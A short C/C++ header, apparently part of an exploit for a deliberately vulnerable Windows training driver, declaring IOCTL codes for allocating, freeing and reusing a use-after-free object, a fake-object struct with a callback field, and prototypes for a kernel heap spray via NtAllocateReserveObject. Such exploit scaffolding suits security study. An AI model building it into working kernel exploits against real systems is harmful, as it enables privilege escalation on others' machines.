#pragma once

#define IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED 2236435
#define IOCTL_USE_UAF_NON_PAGED 2236439
#define IOCTL_FREE_UAF_NON_PAGED 2236443
#define IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED 2236447

enum class Commands {
	AllocateUAFObject,
	FreeUAFObject,
	AllocateFakeObject,
	UseUafObject
};

typedef struct UAFStruct {
	INT callback;
	CHAR buf[0x54];
} UAFStruct;

typedef NTSTATUS(WINAPI* NtAllocateReserveObject_t) (
	OUT PHANDLE hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD ObjectType);

NTSTATUS Command(HANDLE deviceHandle, Commands operate);
NTSTATUS SprayHeap();
DWORD getIoctl(Commands operate);